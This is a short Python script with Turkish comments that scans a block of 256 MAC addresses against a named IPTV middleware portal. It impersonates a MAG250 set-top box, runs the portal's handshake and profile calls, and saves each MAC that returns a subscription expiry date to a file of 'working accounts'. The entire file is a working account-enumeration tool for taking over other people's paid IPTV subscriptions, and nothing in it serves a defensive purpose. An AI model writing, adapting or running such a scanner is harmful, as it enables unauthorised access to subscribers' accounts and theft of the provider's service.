import requests
import json

# Arka plandaki gerçek sunucu
portal_url = "http://4can.net:80/portal.php"
# Görünürdeki panel adresi
display_url = "http://tvserv.cc/c/"

def mac_dogrula(mac):
    headers = {
        'User-Agent': 'MAG250',
        'X-User-Agent': 'Model: MAG250; SW: 2.14.03-r6',
        'Cookie': f'mac={mac}; stb_lang=en; timezone=Europe/Istanbul;',
    }
    
    try:
        # 1. ADIM: Handshake
        res = requests.get(f"{portal_url}?type=stb&action=handshake&token=", headers=headers, timeout=10)
        token = res.json().get('js', {}).get('token')
        
        if token:
            # 2. ADIM: Profil Bilgisi Sorgulama
            # Bu sunucu 'get_profile' üzerinden gerçek bitiş tarihi döndürüyor.
            p_res = requests.get(f"{portal_url}?type=stb&action=get_profile&token={token}", headers=headers, timeout=10)
            data = p_res.json().get('js', {})
            
            # Eğer bitiş tarihi (expired) geliyorsa hesap aktiftir
            if data and data.get('expired'):
                skt = data.get('expired')
                print(f"✅ AKTİF HESAP: {mac} | SKT: {skt}")
                return f"{display_url} | {mac} | SKT: {skt}"
    except:
        pass
    return None

def taramayi_baslat():
    # SADECE senin verdiğin çalışan blok üzerinden gidiyoruz
    prefix = "00:1A:79:B8:3B" 
    print(f"🚀 {display_url} (4can) taranıyor... Hedef Blok: {prefix}")
    
    bulunanlar = []
    
    # B8:3B:00'dan B8:3B:FF'e kadar tara (256 adet)
    for i in range(256):
        suffix = hex(i)[2:].zfill(2).upper()
        test_mac = f"{prefix}:{suffix}"
        
        sonuc = mac_dogrula(test_mac)
        if sonuc:
            bulunanlar.append(sonuc)

    # DOSYAYI SIFIRLA VE YAZ
    with open("calisan_maclar.txt", "w", encoding="utf-8") as f:
        if bulunanlar:
            f.write("\n".join(bulunanlar))
            print(f"🏁 Tarama bitti. {len(bulunanlar)} adet aktif hesap dosyaya yazıldı.")
        else:
            f.write("HATA: Sunucu GitHub IP'sini engellemis olabilir veya bu blokta baska aktif yok.")
            print("❌ Maalesef aktif hesap bulunamadı.")

if __name__ == "__main__":
    taramayi_baslat()
